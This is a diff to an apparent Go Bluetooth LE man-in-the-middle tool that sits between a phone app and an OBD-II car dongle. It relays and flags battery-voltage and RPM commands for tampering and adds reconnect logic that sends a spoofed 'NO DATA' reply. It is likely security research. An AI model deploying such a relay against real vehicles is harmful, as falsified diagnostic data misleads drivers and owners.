@@ -18,14 +18,17 @@ var done = make(chan struct{})
 var gd gatt.Device
 var publicPhoneData []byte
 var publicDongleData []byte
-var tmpDongleData string
-
+var lastSavedPhoneData []byte
 
 var phoneSent bool
 var dongleSent bool
 var isPhoneConnected bool
 var isDongleConnected bool
 var autoConnect bool
+var dongleReconnect bool
+
+
+var tmpDongleData string
 var ATcommand string
 
 func getHexRPM(x []byte, pctIncrease float64) []byte {
@@ -156,21 +159,31 @@ func onPeriphConnected(p gatt.Peripheral, err error) {
 			if (strings.Contains(c.Properties().String(), "write")) {
 				for isPhoneConnected {
 					fmt.Println("| Ready to write commands towards dongle ... ")
-					for phoneSent == false {
+					for phoneSent == false && dongleReconnect == false {
 						// Awaiting data from Phone to be sent towards the Dongle ...
 					}
 					phoneSent = false // Data from phone was recieved, reset state to false.
-					var stringData = string(publicPhoneData)
-					// stringData - for modifying data, please add to ATcommand - which specific data should be modified.
-					switch {
-					case strings.Contains(stringData, "AT RV"): // AT RV = BATTERY VOLTAGE
-						ATcommand = "RV"
-					case strings.Contains(stringData, "010C"): // 010C = RPM
-						ATcommand = "010C"
+					if dongleReconnect {
+						var stringLastSaved = string(lastSavedPhoneData)
+						fmt.Println("Reconnect ...  " + stringLastSaved)
+						publicDongleData = []byte("NO DATA\r>")
+						fmt.Println(">> Dongle sent data back")
+						dongleSent = true
+						dongleReconnect = false
+					} else {
+						lastSavedPhoneData = publicPhoneData
+						var stringData = string(publicPhoneData)
+						// stringData - for modifying data, please add to ATcommand - which specific data should be modified.
+						switch {
+						case strings.Contains(stringData, "AT RV"): // AT RV = BATTERY VOLTAGE
+							ATcommand = "RV"
+						case strings.Contains(stringData, "010C"): // 010C = RPM
+							ATcommand = "010C"
+						}
+						
+						p.WriteCharacteristic(c, publicPhoneData, false)
+						publicPhoneData = []byte("")
 					}
-
-					p.WriteCharacteristic(c, publicPhoneData, false)
-					publicPhoneData = []byte("")
 				}
 			}
 
@@ -209,6 +222,8 @@ func onPeriphDisconnected(p gatt.Peripheral, err error) {
 	dongleSent = false
 	phoneSent = false
 	if autoConnect {
+		fmt.Println("Dongle autoconnecting ON")
+		dongleReconnect = true
 		connectToDongle()
 	} else {
 	close(done)
@@ -230,6 +245,7 @@ func writeService() *gatt.Service {
 	s.AddCharacteristic(gatt.MustParseUUID("0000fff2-0000-1000-8000-00805f9b34fb")).HandleWriteFunc(
 		func(r gatt.Request, data []byte) (status byte) {
 			isPhoneConnected = true
+			fmt.Println("I WAS CALLED...")
 			fmt.Println("| Ready to handle data from phone")
 			for isDongleConnected == false {
 				// Do not continue until Dongle connection has been established
@@ -339,6 +355,7 @@ func main() {
 	isDongleConnected = false
 	phoneSent = false
 	dongleSent = false
+	dongleReconnect = false
 	beginAttack()
 }
 
